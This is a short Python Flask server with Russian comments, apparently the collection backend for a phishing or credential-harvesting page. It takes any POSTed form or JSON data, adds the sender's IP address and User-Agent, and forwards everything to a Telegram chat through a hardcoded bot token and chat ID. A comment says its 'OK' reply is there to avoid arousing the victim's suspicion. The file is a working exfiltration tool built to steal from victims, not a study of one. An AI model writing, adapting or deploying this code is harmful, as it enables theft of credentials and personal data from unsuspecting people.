from flask import Flask, request
import requests
import json

app = Flask(__name__)

# Данные бота
BOT_TOKEN = "8868232573:AAE8OmRfh0Qv192N2b7xfRVEG5IAxRD6-iM"
CHAT_ID = "-1004324836304"


def send_to_telegram(data):
    """Отправляет данные в Telegram"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    # Форматируем данные для удобного чтения
    message = f"🔴 <b>new data!</b>\n\n"
    for key, value in data.items():
        message += f"<b>{key}</b>: {value}\n"

    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Ошибка отправки в ТГ: {e}")


@app.route("/", methods=["POST"])
def handle_post():
    """Принимает любые POST-запросы и отправляет в Telegram"""
    # Получаем данные из запроса (JSON или form-data)
    if request.is_json:
        data = request.get_json()
    else:
        data = request.form.to_dict()

    # Добавляем заголовки для контекста
    data["IP_адрес"] = request.remote_addr
    data["User-Agent"] = request.headers.get("User-Agent")

    # Отправляем в Телеграм
    send_to_telegram(data)

    # Возвращаем ответ, чтобы не вызвать подозрений у жертвы
    return "OK", 200


if __name__ == "__main__":
    # Запускаем сервер на всех интерфейсах, порт 5000
    app.run(host="0.0.0.0", port=5000, debug=False)